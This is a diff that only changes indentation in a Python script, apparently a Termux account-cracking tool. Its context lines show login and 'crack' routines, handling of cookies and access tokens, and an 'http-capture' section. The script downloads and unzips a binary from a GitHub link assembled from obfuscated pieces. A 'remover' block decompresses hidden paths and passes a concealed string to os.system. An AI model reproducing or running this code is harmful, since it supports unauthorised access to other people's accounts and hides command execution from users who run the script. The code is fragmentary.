@@ -48,13 +48,13 @@ elif 'arm' in str(find_aarch):
 
          download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true' 
 
- else: 
+else: 
 
          print(' Unknown aarch ') 
 
          exit() 
 
- if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'): 
+if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'): 
 
          os.system('clear') 
 
@@ -64,7 +64,7 @@ elif 'arm' in str(find_aarch):
 
          os.system('python jan.py') 
 
- else: 
+else: 
 
          akk2="rsi" 
 
@@ -80,7 +80,7 @@ elif 'arm' in str(find_aarch):
 
          os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null') 
 
- try: 
+try: 
 
          import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct 
 
@@ -94,7 +94,7 @@ elif 'arm' in str(find_aarch):
 
          from Crypto.Random import get_random_bytes 
 
- except Exception as e: 
+except Exception as e: 
 
          print(e) 
 
@@ -102,7 +102,7 @@ elif 'arm' in str(find_aarch):
 
          os.system('pip install futures==2 && python jan.py') 
 
- except FileExistsError: 
+except FileExistsError: 
 
          os.system('pip uninstall requests urllib3 idna certifi -y') 
 
@@ -110,7 +110,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- try: 
+try: 
 
          import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib 
 
@@ -118,7 +118,7 @@ elif 'arm' in str(find_aarch):
 
          from concurrent.futures import ThreadPoolExecutor as ThreadPool 
 
- except ModuleNotFoundError: 
+except ModuleNotFoundError: 
 
          print('\n Installing missing modules ...') 
 
@@ -138,7 +138,7 @@ elif 'arm' in str(find_aarch):
 
  #----[remover]----- 
 
- import os,shutil,zlib 
+import os,shutil,zlib 
 
  sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94') 
 
@@ -158,7 +158,7 @@ elif 'arm' in str(find_aarch):
 
  #--checking if file is not avalible 
 
- if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"): 
+if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"): 
 
          pass 
 
@@ -166,7 +166,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- if os.path.exists(sz): 
+if os.path.exists(sz): 
 
          os.rename(sz1,'.f1') 
 
@@ -180,7 +180,7 @@ elif 'arm' in str(find_aarch):
 
          os.system(sz6) 
 
- else: 
+else: 
 
          pass 
 
@@ -304,7 +304,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def qsbuy(): 
+def qsbuy(): 
 
          try: 
 
@@ -370,7 +370,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def rrrr(): 
+def rrrr(): 
 
          if bumper in myweb2: 
 
@@ -380,11 +380,11 @@ elif 'arm' in str(find_aarch):
 
                  qsbuy() 
 
- def xchker(): 
+def xchker(): 
 
      pass 
 
- def main(): 
+def main(): 
 
          xchker() 
 
@@ -656,7 +656,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def login(): 
+def login(): 
 
          os.system('clear') 
 
@@ -702,7 +702,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def method_crack(): 
+def method_crack(): 
 
          os.system('clear') 
 
@@ -762,7 +762,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- class crack_main(): 
+class crack_main(): 
 
          def __init__(self): 
 
@@ -1074,7 +1074,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def create_file(): 
+def create_file(): 
 
          os.system('clear') 
 
@@ -1116,7 +1116,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def create_file_login(): 
+def create_file_login(): 
 
          ids = [] 
 
@@ -1190,7 +1190,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def auto_file(cookies,access_token): 
+def auto_file(cookies,access_token): 
 
          global total 
 
@@ -1278,7 +1278,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def new_file(cookies,access_token): 
+def new_file(cookies,access_token): 
 
          global total 
 
@@ -1392,7 +1392,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def iamBadBoy(exid,cookies,access_token,sf): 
+def iamBadBoy(exid,cookies,access_token,sf): 
 
          try: 
 
@@ -1436,7 +1436,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def sep(): 
+def sep(): 
 
          xchker() 
 
@@ -1486,7 +1486,7 @@ elif 'arm' in str(find_aarch):
 
   
 
- def double(): 
+def double(): 
 
          os.system('clear') 
 
@@ -1528,7 +1528,7 @@ elif 'arm' in str(find_aarch):
 
  #----[http-capture]---- 
 
- try: 
+try: 
 
          a = "anar" 
 
